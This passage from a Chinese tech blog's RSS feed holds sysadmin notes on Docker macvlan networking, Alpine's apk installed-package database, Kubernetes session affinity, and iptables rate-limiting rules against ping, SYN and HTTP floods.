<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rm</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> myMaclan</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">      #清除自定义网卡</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ens33</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> promisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> off</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">   #取消网卡的混合模式</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> a</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #验证是否已取消</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>7.小节</h3>
<p>该模式的小实验比较简单，3个核心步骤：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">1、主、从节点分别创建macvlan网络</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">2、主节点启动容器(nginx</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)时，指定网络模式为自定义的网络</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">3、从节点启动容器(tomcat</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)时，分别先不指定/指定自定义网络后，进入(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">tomcat</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)容器，去尝试ping主节点容器(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nginx</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)IP。</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>该方式，一样可以实现跨节点通信，但只是昙花一现，满足了特定时期需求。</p>
<p>弊端：主从节点上都需要创建macvlan的自定义网络，容器启动时也都需要指定网络模式为macvlan，不难但是比较low稍显繁琐。</p>
<p>macvlan的通信原理，主从节点都需要创建完全相同的自定义网络，都通过-d或者--driver指定为macvlan，同时指定--subnet子网网段和--gateway网关，当然如果创建自定义网络时你不指定，在docker run命令时，你依然可以指定。</p>
<p>但是，需要注意的是，主从节点各自定义的macvan的网关和子网网段要相同，从而造成两个不同的宿主机的自定义网卡都处于同一个网段，给人的错觉就是他们就是1个小的局域网，在主从节点中的容器在docker run时，都通过--network指定这个自定义的网络。</p>
<p>这样，就自然而然的实现了跨宿主机通信。</p>
<h2>总结</h2>
<p>尽管overlay（overlay2）和macvlan都可以实现跨宿主机通信，但是相对的前者更为便捷一些，但是随着新容器编排技术的不断涌现，这些当时时髦的技术也终将被替代。就连docker官网自己推出的Docker-compose[官网]（它是一个单机多容器部署工具，不支持多机）编排工具，也正在被k8s（支持多容器、多机部署）替代，后续将陆续对这些编排工具做具体介绍。</p>
<p>不过这些不重要，长江后浪推前浪，k8s终究是配置太多，强大的同时也太繁琐，终将会被更强大的其他替代，万变不离其宗，了解了这些底层些的知识，再学习其他编排工具时，也更加是游刃有余。</p>
<h2>附注</h2>
<ol>
<li>
<p>Docker容器 | Dockerfile优化</p>
</li>
<li>
<p>Docker容器的生命周期 | kill和stop | pause 和 unpause</p>
</li>
<li>
<p>Docker容器五种(3+2)网络模式 | bridge模式 | host模式 | none模式 | container 模式 | 自定义网络模式详解</p>
</li>
<li>
<p>Docker外部浏览器访问容器 | 容器访问容器 | 访问容器的常用5种方式 | -p -P 详解</p>
</li>
<li>
<p>Docker容器之间单/双向通信 |--link /自定义网络实现互认容器别名</p>
</li>
<li>
<p>Docker容器间数据挂载与共享 | 远程共享&amp;挂载数据卷</p>
</li>
</ol>
]]></content:encoded>
    </item>
    <item>
      <title>Openresty和lua脚本实战</title>
      <link>https://www.geekery.cn/note-book/Nginx-OpenResty/Openresty%E5%92%8Clua%E8%84%9A%E6%9C%AC%E5%AE%9E%E6%88%98.html</link>
      <guid>https://www.geekery.cn/note-book/Nginx-OpenResty/Openresty%E5%92%8Clua%E8%84%9A%E6%9C%AC%E5%AE%9E%E6%88%98.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Openresty和lua脚本实战</source>
      <description>Openresty和lua脚本实战</description>
      <pubDate>Wed, 29 May 2024 02:44:55 GMT</pubDate>
      <content:encoded><![CDATA[
]]></content:encoded>
    </item>
    <item>
      <title>Alpine的apk数据库解释</title>
      <link>https://www.geekery.cn/note-book/OperaSystems/Alpine/Alpine%E7%B3%BB%E7%BB%9F%E7%81%BE%E9%9A%BE%E6%81%A2%E5%A4%8D-%E6%81%B6%E6%84%8F%E8%AE%BE%E7%BD%AE%E6%95%B4%E4%B8%AA%E6%A0%B9%E7%9B%AE%E5%BD%95000%E6%9D%83%E9%99%90.html</link>
      <guid>https://www.geekery.cn/note-book/OperaSystems/Alpine/Alpine%E7%B3%BB%E7%BB%9F%E7%81%BE%E9%9A%BE%E6%81%A2%E5%A4%8D-%E6%81%B6%E6%84%8F%E8%AE%BE%E7%BD%AE%E6%95%B4%E4%B8%AA%E6%A0%B9%E7%9B%AE%E5%BD%95000%E6%9D%83%E9%99%90.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Alpine的apk数据库解释</source>
      <description>Alpine的apk数据库解释 apk对于已安装文件用于跟踪已安装的软件包以及这些软件包对系统所做的修改。 该文件位于/lib/apk/db/installed 文件示例 目录结构 解释说明 在源码中的定义 https://gitlab.alpinelinux.org/alpine/apk-tools/-/blob/ff7c8f6ee9dfa2add5...</description>
      <pubDate>Sat, 25 May 2024 07:27:46 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>apk对于已安装文件用于跟踪已安装的软件包以及这些软件包对系统所做的修改。</p>
<p>该文件位于/lib/apk/db/installed</p>
</blockquote>
<h2>文件示例</h2>
<div class="language-txt line-numbers-mode" data-highlighter="shiki" data-ext="txt" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>localhost:/lib/apk/db# head -50 installed</span></span>
<span class="line"><span>C:Q1uFrSebP91NTnM7BIHm3YcRY7ih0=</span></span>
<span class="line"><span>P:alpine-base</span></span>
<span class="line"><span>V:3.20.0-r0</span></span>
<span class="line"><span>A:x86_64</span></span>
<span class="line"><span>S:1492</span></span>
<span class="line"><span>I:4096</span></span>
<span class="line"><span>T:Meta package for minimal alpine base</span></span>
<span class="line"><span>U:https://alpinelinux.org</span></span>
<span class="line"><span>L:MIT</span></span>
<span class="line"><span>o:alpine-base</span></span>
<span class="line"><span>m:Natanael Copa &lt;ncopa@alpinelinux.org&gt;</span></span>
<span class="line"><span>t:1716371157</span></span>
<span class="line"><span>c:1402388a3a746e9961791846350e35f1d4d4618d</span></span>
<span class="line"><span>D:alpine-baselayout alpine-conf alpine-release apk-tools busybox busybox-mdev-openrc busybox-openrc busybox-suid musl-utils openrc</span></span>
<span class="line"><span></span></span>
<span class="line"><span>C:Q1qKcZ+j23xssAXmgQhkOO8dHnbWw=</span></span>
<span class="line"><span>P:alpine-baselayout</span></span>
<span class="line"><span>V:3.6.5-r0</span></span>
<span class="line"><span>A:x86_64</span></span>
<span class="line"><span>S:8515</span></span>
<span class="line"><span>I:315392</span></span>
<span class="line"><span>T:Alpine base dir structure and init scripts</span></span>
<span class="line"><span>U:https://git.alpinelinux.org/cgit/aports/tree/main/alpine-baselayout</span></span>
<span class="line"><span>L:GPL-2.0-only</span></span>
<span class="line"><span>o:alpine-baselayout</span></span>
<span class="line"><span>m:Natanael Copa &lt;ncopa@alpinelinux.org&gt;</span></span>
<span class="line"><span>t:1714981135</span></span>
<span class="line"><span>c:66187892e05b03a41d08e9acabd19b7576a1c875</span></span>
<span class="line"><span>D:alpine-baselayout-data=3.6.5-r0 /bin/sh</span></span>
<span class="line"><span>r:alpine-baselayout</span></span>
<span class="line"><span>q:1000</span></span>
<span class="line"><span>F:dev</span></span>
<span class="line"><span>F:dev/pts</span></span>
<span class="line"><span>F:dev/shm</span></span>
<span class="line"><span>F:etc</span></span>
<span class="line"><span>R:motd</span></span>
<span class="line"><span>Z:Q1SLkS9hBidUbPwwrw+XR0Whv3ww8=</span></span>
<span class="line"><span>F:etc/crontabs</span></span>
<span class="line"><span>R:root</span></span>
<span class="line"><span>a:0:0:600</span></span>
<span class="line"><span>Z:Q1vfk1apUWI4yLJGhhNRd0kJixfvY=</span></span>
<span class="line"><span>F:etc/modprobe.d</span></span>
<span class="line"><span>R:aliases.conf</span></span>
<span class="line"><span>Z:Q1WUbh6TBYNVK7e4Y+uUvLs/7viqk=</span></span>
<span class="line"><span>R:blacklist.conf</span></span>
<span class="line"><span>Z:Q14TdgFHkTdt3uQC+NBtrntOnm9n4=</span></span>
<span class="line"><span>R:i386.conf</span></span>
<span class="line"><span>Z:Q1pnay/njn6ol9cCssL7KiZZ8etlc=</span></span>
<span class="line"><span>R:kms.conf</span></span>
<span class="line"><span>Z:Q1ynbLn3GYDpvajba/ldp1niayeog=</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>目录结构</p>
<div class="language-txt line-numbers-mode" data-highlighter="shiki" data-ext="txt" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>localhost:/lib/apk/db# ls -lh</span></span>
<span class="line"><span>total 504K</span></span>
<span class="line"><span>-rw-r--r--    1 root     root      467.9K May 25 14:51 installed</span></span>
<span class="line"><span>-rw</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>kubernetes会话保持（session）配置</title>
      <link>https://www.geekery.cn/note-book/Kubernetes/kubernetes%E4%BC%9A%E8%AF%9D%E4%BF%9D%E6%8C%81%EF%BC%88session%EF%BC%89%E9%85%8D%E7%BD%AE.html</link>
      <guid>https://www.geekery.cn/note-book/Kubernetes/kubernetes%E4%BC%9A%E8%AF%9D%E4%BF%9D%E6%8C%81%EF%BC%88session%EF%BC%89%E9%85%8D%E7%BD%AE.html</guid>
      <source url="https://www.geekery.cn/rss.xml">kubernetes会话保持（session）配置</source>
      <description>kubernetes会话保持（session）配置 在 Kubernetes 中，您可以通过在 Service 的 YAML 配置中添加 sessionAffinity: ClientIP 来实现会话保持（Session Affinity）。这种方式会将来自同一客户端 IP 地址的请求始终转发到相同的后端 Pod，从而维持会话。以下是对这个配置的详细解...</description>
      <pubDate>Tue, 21 May 2024 05:12:17 GMT</pubDate>
      <content:encoded><![CDATA[
<p>在 Kubernetes 中，您可以通过在 Service 的 YAML 配置中添加 <code>sessionAffinity: ClientIP</code> 来实现会话保持（Session Affinity）。这种方式会将来自同一客户端 IP 地址的请求始终转发到相同的后端 Pod，从而维持会话。以下是对这个配置的详细解释：</p>
<p>通过在 Service 的 <code>spec</code> 中添加以下配置，可以启用会话保持：</p>
<div class="language-yaml line-numbers-mode" data-highlighter="shiki" data-ext="yaml" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">apiVersion</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">v1</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">kind</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">Service</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">metadata</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  name</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">example-service</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">spec</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  selector</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    app</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">example</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  ports</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    - </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">protocol</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">TCP</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      port</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">80</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      targetPort</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">9376</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  sessionAffinity</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ClientIP</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  sessionAffinityConfig</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    clientIP</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      timeoutSeconds</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">10800</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>防御DDoS攻击的iptables规则配置</title>
      <link>https://www.geekery.cn/note-book/Iptables/%E9%98%B2%E5%BE%A1DDoS%E6%94%BB%E5%87%BB%E7%9A%84iptables%E8%A7%84%E5%88%99%E9%85%8D%E7%BD%AE.html</link>
      <guid>https://www.geekery.cn/note-book/Iptables/%E9%98%B2%E5%BE%A1DDoS%E6%94%BB%E5%87%BB%E7%9A%84iptables%E8%A7%84%E5%88%99%E9%85%8D%E7%BD%AE.html</guid>
      <source url="https://www.geekery.cn/rss.xml">防御DDoS攻击的iptables规则配置</source>
      <description>防御DDoS攻击的iptables规则配置 目的 这份笔记记录了如何在Ubuntu 20.04服务器上使用iptables配置防御Ping of Death、SYN Flood和HTTP Flood攻击的规则。我们将通过配置iptables规则来实现这些防御，并确保规则在系统重启后依然有效。 防御Ping of Death攻击 Ping of Deat...</description>
      <pubDate>Mon, 20 May 2024 02:06:59 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>目的</h2>
<p>这份笔记记录了如何在Ubuntu 20.04服务器上使用iptables配置防御Ping of Death、SYN Flood和HTTP Flood攻击的规则。我们将通过配置iptables规则来实现这些防御，并确保规则在系统重启后依然有效。</p>
<h2>防御Ping of Death攻击</h2>
<p>Ping of Death攻击通过发送超大数据包来崩溃目标系统。我们通过限制ICMP请求的速率和数据包大小来防御这种攻击。</p>
<ol>
<li><strong>创建一个新的链来处理ICMP请求：</strong></li>
</ol>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> iptables</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -N</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ICMP_CHECK</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p><strong>在新的链中添加规则：</strong></p>
<ul>
<li>限制ICMP请求的速率</li>
<li>限制ICMP数据包的大小</li>
<li>丢弃不符合上述条件的ICMP请求</li>
</ul>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> iptables</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ICMP_CHECK</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> icmp</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --icmp-type</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> echo-request</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -m</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> limit</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --limit</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 1/s</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --limit-burst</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 4</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> RETURN</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> iptables</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ICMP_CHECK</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> icmp</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --icmp-type</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> echo-request</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -m</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> length</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --length</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 0:100</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> RETURN</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> iptables</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ICMP_CHECK</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DROP</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>在主链中调用新的链：</strong></p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> iptables</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> INPUT</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> icmp</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --icmp-type</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> echo-request</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ICMP_CHECK</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>防御SYN Flood攻击</h2>
<p>SYN Flood攻击通过发送大量SYN请求来消耗服务器资源。我们通过启用SYN cookies和限制SYN请求的速率来防御这种攻击。</p>
<p><strong>启用SYN cookies并永久保存设置：</strong></p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">echo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "net.ipv4.tcp_syncookies = 1"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &gt;&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/etc/sysctl.conf</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> sysctl</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>限制SYN请求的速率：</strong></p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> iptables</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> INPUT</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tcp</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --syn</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -m</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> limit</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --limit</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 1/s</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --limit-burst</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 3</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ACCEPT</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> iptables</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> INPUT</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tcp</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --syn</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DROP</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><h2>防御HTTP Flood攻击</h2>
<p>HTTP Flood攻击通过发送大量HTTP请求来消耗服务器资源。我们通过限制HTTP请求的速率来防御这种攻击。</p>
<p>限制HTTP请求的速率：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> iptables</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> INPUT</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tcp</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --dport</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 80</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -m</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> limit</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --limit</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 25/minute</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --limit-burst</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 100</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ACCEPT</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> iptables</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> INPUT</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tcp</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --dport</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 80</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DROP</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><h2>保存iptables规则</h2>
<p>为了确保iptables规则在系统重启后依然有效，我们需要安装并使用<code>iptables-persistent</code>包。</p>
<p><strong>安装<code>iptables-persistent</code>：</strong></p>
